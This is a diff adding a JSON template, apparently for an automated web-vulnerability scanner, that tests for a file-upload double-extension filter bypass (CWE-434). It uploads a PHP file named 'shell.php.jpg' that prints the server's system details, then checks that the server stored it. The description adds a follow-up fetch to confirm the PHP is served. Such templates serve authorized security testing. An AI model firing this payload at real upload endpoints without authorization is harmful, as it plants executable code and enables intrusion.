@@ -1,0 +1,36 @@
+{
+  "name": "web/Upload double-extension filter bypass",
+  "description": "[high] Proves upload filter bypass via double extension: shell.php.jpg is ACCEPTED and stored (server echoes the path) = blacklist checks only the final extension while the handler maps .php mid-filename. Keywords: file upload bypass double extension php jpg blacklist webshell. ctrl: hardened filter returns 415 -> not falsified. base_url = upload endpoint; pair with a fetch of the returned path to confirm serving.",
+  "cwe": "CWE-434",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/upload",
+      "headers": {
+        "Content-Type": "multipart/form-data; boundary=b9f4c"
+      },
+      "body": "--b9f4c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo \"d11ext\".php_uname().\"d11ext\"; ?>\r\n--b9f4c--\r\n"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "uploads?/[\\w./-]*shell\\.php\\.jpg",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "694ad57d9cf7",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
